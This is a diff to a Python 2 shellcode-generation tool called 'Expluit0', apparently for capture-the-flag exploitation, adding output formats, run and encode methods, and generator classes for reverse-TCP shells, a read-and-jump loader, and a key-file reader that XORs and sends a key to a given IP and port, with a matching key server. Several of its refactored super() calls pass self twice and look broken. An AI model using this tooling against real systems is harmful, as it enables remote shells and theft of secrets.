@@ -51,6 +51,9 @@ FORMAT_CPP = "cpp"
 DEFAULT_FORMAT = FORMAT_PYTHON
 
 class ShellCode(str):
+    def __new__(cls, *args, **kwargs):
+        return str.__new__(cls, *args, **kwargs)
+
     def get(self):
         return self
 
@@ -84,6 +87,92 @@ class ShellCode(str):
             sCodeStr += ";"
 
             return sCodeStr
+
+        elif outFormat == FORMAT_PERL:
+            sCodeStr = """my $sCode =\n"""
+            for idx, ch in enumerate(self):
+                if idx % 8 == 0:
+                    sCodeStr += "\""
+                sCodeStr += "\\x%02x" % ord(ch)
+                if idx % 8 == 7:
+                    sCodeStr += "\" .\n"
+
+            if len(self) % 8 != 0:
+                sCodeStr += "\""
+
+            sCodeStr += ";"
+
+            return sCodeStr
+
+        elif outFormat == FORMAT_RUBY:
+            sCodeStr = """sCode =\n"""
+            for idx, ch in enumerate(self):
+                if idx % 8 == 0:
+                    sCodeStr += "\""
+                sCodeStr += "\\x%02x" % ord(ch)
+                if idx % 8 == 7:
+                    sCodeStr += "\" +\n"
+
+            if len(self) % 8 != 0:
+                sCodeStr += "\""
+
+            return sCodeStr
+
+    def run(self):
+        curPath = os.path.split(os.path.abspath(__file__))[0]
+        runUtil = os.path.join(curPath, "stub", "testScode")
+        tempDir = os.path.join(curPath, TEMP_DIRECTORY)
+        tempfile.tempdir = tempDir
+
+        if not os.path.exists(tempDir):
+            os.mkdir(tempDir)
+
+        tempFile = tempfile.mktemp()
+
+        binFile = tempFile + ".bin"
+        print "[*] Temp File: <%s>" % tempFile
+
+        open(binFile, "wb").write(self + "\x00")
+
+        print "[*] Run Shellcode: %s" % (os.path.basename(binFile))
+        print "$ %s %s" % (os.path.basename(runUtil), os.path.basename(binFile))
+        testCode = "%s %s" % (runUtil, binFile)
+
+        # Run Shellcode
+        os.system(testCode)
+
+        return
+
+    def encode(self, *restricted):
+        curPath = os.path.split(os.path.abspath(__file__))[0]
+        tempDir = os.path.join(curPath, TEMP_DIRECTORY)
+        tempfile.tempdir = tempDir
+
+        if not os.path.exists(tempDir):
+            os.mkdir(tempDir)
+
+        tempFile = tempfile.mktemp()
+
+        binFile = tempFile + ".bin"
+        encFile = tempFile + ".enc.bin"
+        print "[*] Temp File: <%s>" % tempFile
+
+        open(binFile, "wb").write(self + "\x00")
+
+        print "[*] Encode Shellcode"
+        defaultBytes = ['0x00', '0x0d', '0x0a', '0x2f']
+        restrictedBytes = defaultBytes + list(restricted)
+        print "[*] with restricted bytes:", " ".join(b for b in restrictedBytes)
+
+        restrictedParam = ",".join(b for b in restrictedBytes)
+        cmdStr = "./encoder/encoder %s %s > %s" % (binFile, restrictedParam, encFile)
+        os.system(cmdStr)
+
+        enc_sCode = open(encFile, "rb").read()
+        print "[*] wrote [0x%x] [%d] bytes encoded shellcode\n" % (len(enc_sCode), len(enc_sCode))
+
+        return ShellCode(enc_sCode)
+
 
 class InvalidPlatformError(Exception):
     pass
@@ -130,15 +219,15 @@ class ScodeGen(object):
         self.encFile = self.tempFile + ".enc.bin"
         print "[*] Temp File: <%s>" % self.tempFile
 
-        self.testFile = os.path.join(self.curPath, "stub", "testScode")
+        self.runUtil = os.path.join(self.curPath, "stub", "testScode")
 
-        self.__prepareStub()
+        self._prepareStub()
         self.sCode = self.__loadScode()
 
         return
 
-    def __prepareStub(self):
-        print "[*] __prepareStub()"
+    def _prepareStub(self):
+        print "[*] _prepareStub()"
 
         # Prepare Stub
         stub = open(os.path.join(self.stubDir, self.stubFile)).read()
@@ -148,6 +237,7 @@ class ScodeGen(object):
         # Compile Stub
         os.system("as %s -o %s" % (self.asmFile, self.objFile))
         os.system("objdump -d %s > %s" % (self.objFile, self.dumpFile))
+
         return
 
     def __loadScode(self):
@@ -166,41 +256,48 @@ class ScodeGen(object):
 
         return ShellCode(sCode)
 
-    def testScode(self):
-        print "[*] Test Shellcode: %s %s" % (os.path.basename(self.testFile), os.path.basename(self.binFile))
-        testCode = "%s %s" % (self.testFile, self.binFile)
+    def run(self):
+        print "[*] Run Shellcode: %s" % (os.path.basename(self.binFile))
+        print "$ %s %s" % (os.path.basename(self.runUtil), os.path.basename(self.binFile))
+        testCode = "%s %s" % (self.runUtil, self.binFile)
 
         # Run Shellcode
         os.system(testCode)
+
+        return
 
     def get(self):
         return self.sCode
 
     def getFormat(self, outFormat=FORMAT_PYTHON):
-        return self.sCode.getForamt(outFormat)
+        return self.sCode.getFormat(outFormat)
 
     def encode(self, *restricted):
-        print "[*] encode()\n"
-        print restricted
-        restrictedBytes = "0x00,0x0d,0x0a,0x2f"
-        cmdStr = "./encoder/encoder %s %s > %s" % (self.binFile, restrictedBytes, self.encFile)
+        print "[*] Encode Shellcode"
+        defaultBytes = ['0x00', '0x0d', '0x0a', '0x2f']
+        restrictedBytes = defaultBytes + list(restricted)
+        print "[*] with restricted bytes:", " ".join(b for b in restrictedBytes)
+
+        restrictedParam = ",".join(b for b in restrictedBytes)
+        cmdStr = "./encoder/encoder %s %s > %s" % (self.binFile, restrictedParam, self.encFile)
         os.system(cmdStr)
 
         enc_sCode = open(self.encFile, "rb").read()
         print "[*] wrote [0x%x] [%d] bytes encoded shellcode\n" % (len(enc_sCode), len(enc_sCode))
-        return enc_sCode
+
+        return ShellCode(enc_sCode)
 
 class PayloadLoaderScodeGen(ScodeGen):
-    def __init__(self, fdNum = 0x04, payloadSize = 0x400, platform = (DEFAULT_PLATFORM_OS, DEFAULT_PLATFORM_ARCH), stubFile = "read_jump.s"):
+    def __init__(self, fdNum=0x04, payloadSize=0x400, platform=(DEFAULT_PLATFORM_OS, DEFAULT_PLATFORM_ARCH), stubFile="read_jump.s"):
         self.fdNum = fdNum
-        self.payloadSize = payloadSize # Unit : 256
+        self.payloadSize = payloadSize
 
-        ScodeGen.__init__(self, platform, stubFile)
+        super(PayloadLoaderScodeGen, self).__init__(self, platform, stubFile)
 
         return
 
     def _prepareStub(self):
-        print "[*] __prepareStub()"
+        print "[*] _prepareStub()"
 
         # Prepare Stub
         stub = open(os.path.join(self.stubDir, self.stubFile)).read()
@@ -213,19 +310,20 @@ class PayloadLoaderScodeGen(ScodeGen):
         # Compile Stub
         os.system("as %s -o %s" % (self.asmFile, self.objFile))
         os.system("objdump -d %s > %s" % (self.objFile, self.dumpFile))
+
         return
 
 class ReverseConnectionScodeGen(ScodeGen):
-    def __init__(self, ipAddr, portNum, platform = (DEFAULT_PLATFORM_OS, DEFAULT_PLATFORM_ARCH), stubFile = "reverse_tcp.s"):
+    def __init__(self, ipAddr, portNum, platform=(DEFAULT_PLATFORM_OS, DEFAULT_PLATFORM_ARCH), stubFile="reverse_tcp.s"):
         self.ipAddr = ipAddr
         self.portNum = portNum
 
-        ScodeGen.__init__(self, platform, stubFile)
+        super(ReverseConnectionScodeGen, self).__init__(self, platform, stubFile)
 
-        pass
+        return
 
     def _prepareStub(self):
-        print "[*] __prepareStub()"
+        print "[*] _prepareStub()"
 
         # Prepare Stub
         stub = open(os.path.join(self.stubDir, self.stubFile)).read()
@@ -241,23 +339,24 @@ class ReverseConnectionScodeGen(ScodeGen):
         # Compile Stub
         os.system("as %s -o %s" % (self.asmFile, self.objFile))
         os.system("objdump -d %s > %s" % (self.objFile, self.dumpFile))
+
         return
 
 
 class ReadScodeGen(ScodeGen):
-    def __init__(self, keyFile, keySize, ipAddr, portNum, xorValue = 0x77, platform = (DEFAULT_PLATFORM_OS, DEFAULT_PLATFORM_ARCH), stubFile = "sample.s"):
+    def __init__(self, keyFile, keySize, ipAddr, portNum, xorValue=0x77, platform=(DEFAULT_PLATFORM_OS, DEFAULT_PLATFORM_ARCH), stubFile="sample.s"):
         self.keyFile = keyFile
         self.keySize = keySize
         self.ipAddr = ipAddr
         self.portNum = portNum
         self.xorValue = xorValue
 
-        ScodeGen.__init__(self, platform, stubFile)
+        super(ReadScodeGen, self).__init__(self, platform, stubFile)
 
         return
 
     def _prepareStub(self):
-        print "[*] __prepareStub()"
+        print "[*] _prepareStub()"
 
         # Prepare Stub
         stub = open("%s/%s" % (self.stubDir, self.stubFile)).read()
@@ -270,13 +369,13 @@ class ReadScodeGen(ScodeGen):
         return
 
 class SecuInsideScodeGen(ReverseConnectionScodeGen):
-    def __init__(self, ipAddr, portNum, platform = (DEFAULT_PLATFORM_OS, DEFAULT_PLATFORM_ARCH), stubFile = "secuinside.s"):
-        ReverseConnectionScodeGen.__init__(self,ipAddr, portNum, platform, stubFile)
+    def __init__(self, ipAddr, portNum, platform=(DEFAULT_PLATFORM_OS, DEFAULT_PLATFORM_ARCH), stubFile="secuinside.s"):
+        super(SecuInsideScodeGen, self).__init__(self, ipAddr, portNum, platform, stubFile)
 
         return
 
     def _prepareStub(self):
-        print "[*] __prepareStub()"
+        print "[*] _prepareStub()"
 
         # Prepare Stub
         stub = open(os.path.join(self.stubDir, self.stubFile)).read()
@@ -297,7 +396,7 @@ class SecuInsideScodeGen(ReverseConnectionScodeGen):
 
 
 class KeyServer(TCPServer):
-    KeyServer.allow_reuse_address = True
+    allow_reuse_address = True
 
 
 class KeyHandler(BaseRequestHandler):
@@ -349,7 +448,7 @@ def fromInetAddr(inetAddr):
     inetAddrNum = int(inetAddr, 16)
     inetTable = []
 
-    while inetAddrNum :
+    while inetAddrNum:
         inetTable.append(str(inetAddrNum % 256))
         inetAddrNum /= 256
 
@@ -380,6 +479,7 @@ if __name__ == '__main__':
     import optparse
     from sys import argv
 
+    # For the future.
     # Banner
     print "Expluit0"
     print "by Posquit0 <posquit0.bj@gmail.com>"
